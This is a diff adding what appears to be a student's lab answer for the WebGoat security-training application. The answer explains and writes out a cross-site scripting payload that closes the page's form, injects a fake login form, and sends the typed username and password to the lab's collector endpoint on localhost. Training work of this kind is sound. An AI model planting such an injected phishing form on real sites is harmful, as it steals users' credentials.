@@ -1,0 +1,22 @@
+Here is the code for part1:
+
+</form>
+<script>
+function log_in(){ 
+	var xhttp = new XMLHttpRequest(); 
+	var req = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&user="+ document.phishingForm.user.value + "&password=" + document.phishingForm.pass.value; 
+	alert("Sending request: "+req);
+	xhttp.open("POST", req, true);
+	xhttp.send();
+} 
+</script>
+<form name="phishingForm"><br>
+	Username:<br>
+	<input type="text" name="user"><br>
+	Password:<br>
+	<input type="password" name = "pass"><br>
+	<input type="submit" onclick="log_in()">
+</form>
+
+
+In this exploit, we uses XSS (Cross-site scripting) to use Javscript to create a simple form that prompts the user for his / her username and pasword. The onclick() function handler of sends a POST request to a third party with information on the user's username and password entered. Note that the initial </form> tag is required to terminate the previous form DOM element. In the case of our remote testing, WebGoat is hosted at localhost:8090/WebGoat and the req URL should be changed accordingly on the testing environment.
